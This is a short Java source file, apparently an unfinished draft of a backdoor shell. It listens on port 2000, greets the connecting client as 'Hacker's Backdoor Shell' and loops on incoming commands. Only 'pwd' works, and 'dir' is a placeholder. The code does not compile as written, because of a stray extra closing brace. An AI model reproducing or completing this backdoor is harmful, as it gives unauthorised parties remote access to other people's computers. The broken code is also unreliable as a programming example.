import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOError;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.ServerSocket;
import java.net.Socket;

public class BackDoor_Shell {

	public static void main(String[] args) {
		// TODO Auto-generated method stub

		try {
			ServerSocket server=new ServerSocket(2000);
			Socket client=server.accept();
			String workingDir=System.getProperty("user.dir");
			String prompt=System.getProperty("os.name").toLowerCase().contains("mac os")?" % ":" :> ";
			System.out.println();
			
			//File workDirectory=System.getProperty(null)
			
			InputStream in=client.getInputStream();
			OutputStream out=client.getOutputStream();
			
			BufferedReader reader=new BufferedReader(new InputStreamReader(in));
			BufferedWriter writer=new BufferedWriter(new OutputStreamWriter(out));
		
			writer.write("\nWelcome to Hacker's Backdoor Shell\n\n");
			
			while(true) {
				
				writer.write(workingDir+prompt);
				writer.flush();
				String clientCommand=reader.readLine();
				
				if(clientCommand.equalsIgnoreCase("pwd")) {
					writer.write("\nWorking directory is: "+workingDir+"\n\n");
				}
				else if(clientCommand.equalsIgnoreCase("dir")){
					writer.write("\nShould list files in the current directory \n\n");
				}
				
				
			}
			
			

		}
		catch(IOException e) {
			e.printStackTrace();
		}
		

	}

	}

}
